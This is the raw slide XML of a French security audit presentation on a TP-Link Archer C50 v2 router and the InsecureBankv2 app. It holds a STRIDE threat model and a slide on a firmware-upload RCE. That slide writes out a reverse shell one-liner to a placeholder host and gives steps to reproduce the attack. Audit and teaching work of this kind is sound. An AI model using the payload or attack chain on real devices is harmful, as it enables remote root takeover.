        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2660904" y="3877056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6" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2843784" y="384962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sur admin</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4745736" y="3090672"/>
            <a:ext cx="20574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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4745736" y="3090672"/>
            <a:ext cx="2057400" cy="2926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41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4745736" y="30906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5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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873752" y="3493008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43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5056632" y="346557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RSA vérifiée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Shape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873752" y="3877056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45" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5056632" y="384962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Boot</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873752" y="4261104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47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5056632" y="42336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chiffré + hash</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6958584" y="3090672"/>
            <a:ext cx="20574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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Shape 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6958584" y="3090672"/>
            <a:ext cx="2057400" cy="2926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50" name="Text 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6958584" y="30906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5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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3493008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52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="346557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+ alertes temps réel</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Shape 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3877056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54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="384962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API</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Shape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4261104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56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="42336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audit centralisés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Shape 5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58" name="Text 5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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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STRIDE</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Threat Modeling par composant IoT Banking</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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STRIDE appliquée au firmware TP-Link, à l'APK InsecureBankv2 et à l'API Backend</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="64008" cy="109728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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="14447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100" b="1">
                <a:solidFill>
                  <a:srgbClr val="99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  Spoofing (Usurpation)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="1773936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Backdoor devadmin — accès sans credentials</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="95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de MFA sur l'interface admin LuCI</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2569464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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2569464"/>
            <a:ext cx="64008" cy="1097280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6" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="26609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100" b="1">
                <a:solidFill>
                  <a:srgbClr val="9A34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Tampering (Falsification)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="2990088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non signé — upload libre via LuCI</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="95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IDOR /dotransfer modifiables côté client</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3785616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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3785616"/>
            <a:ext cx="64008" cy="109728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0" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="387705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  Répudiation</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="484632" y="420624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audit trail des virements bancaires</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="95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applicatifs absents côté serveur API</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1353312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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1353312"/>
            <a:ext cx="64008" cy="109728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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919472" y="14447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>
                <a:solidFill>
                  <a:srgbClr val="5B21B6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I  Information </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B21B6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Disclosure (Divulgation des vulnérabilités)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919472" y="1773936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AES hardcodée + 'superSecurePassword' dans APK</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="95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en clair : HTTP + Logcat Android</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2569464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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2569464"/>
            <a:ext cx="64008" cy="10972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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919472" y="26609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>
                <a:solidFill>
                  <a:srgbClr val="0E74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  Déni de service</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919472" y="2990088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>
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Absence de rate-limiting sur tous les Endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof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fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Surcharge possible via IDOR /dotransfer en boucle</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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754880" y="3785616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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="3785616"/>
            <a:ext cx="64008" cy="109728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2" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4919472" y="387705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>
                <a:solidFill>
                  <a:srgbClr val="065F46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E  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="065F46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Elévation de privilèges</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" b="1" noProof="0">
              <a:solidFill>
                <a:srgbClr val="065F46"/>
              </a:solidFill>
              <a:latin typeface="Trebuchet M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919472" y="420624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>
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Reverse shell root via CVE-2025-15517 (CVSS 8.6)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof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fr-FR" sz="950">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Activité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> Android exportées — bypass auth complet</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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5" name="Text 3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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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05a — VULNÉRABILITÉS FIRMWARE</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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TP-Link Archer C50 v2 — CVE-2025-15517</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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Binwalk / Émulation QEMU — Remote Code Execution via Upload Firmware</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="85039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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="8503920" cy="3657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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="13533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CVE-2025-15517  |  Firmware Upload RCE — TP-Link Archer C50 v2  |  CVSS 8.6  —  HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="181051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b="1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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2487168" y="1810512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/usr/lib/lua/luci/controller/admin/system.lua (LuCI OpenWRT)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="215798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b="1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vulnérable</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2487168" y="2157984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/sbin/sysupgrade %s %q  — aucune validation cryptographique du fichier</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="250545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b="1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injecté</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2487168" y="2505456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>
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>/bin/sh -i &gt;&amp; /dev/tcp/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>ip_cible/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>4444 0&gt;&amp;1  (reverse shell)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs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28529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b="1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d'attaque</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2487168" y="2852928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firmware malveillant → sysupgrade → exécution Payload → shell root distant</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3520440"/>
            <a:ext cx="1965960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2" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="35204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Root</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="3520440"/>
            <a:ext cx="1965960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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="35204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RCE Distant</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="3520440"/>
            <a:ext cx="1965960" cy="34747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6" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="35204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Compromission totale</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3520440"/>
            <a:ext cx="1965960" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="35204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/ I / A impactés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="39776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>
                <a:solidFill>
                  <a:srgbClr val="1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Étapes de reproduction</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="427939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binwalk -e firmware.bin  →  extraction du système de fichiers et identification des services exposés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="448970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FAT.py / QEMU  →  émulation firmware, scan nmap, accès interface LuCI confirmé</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
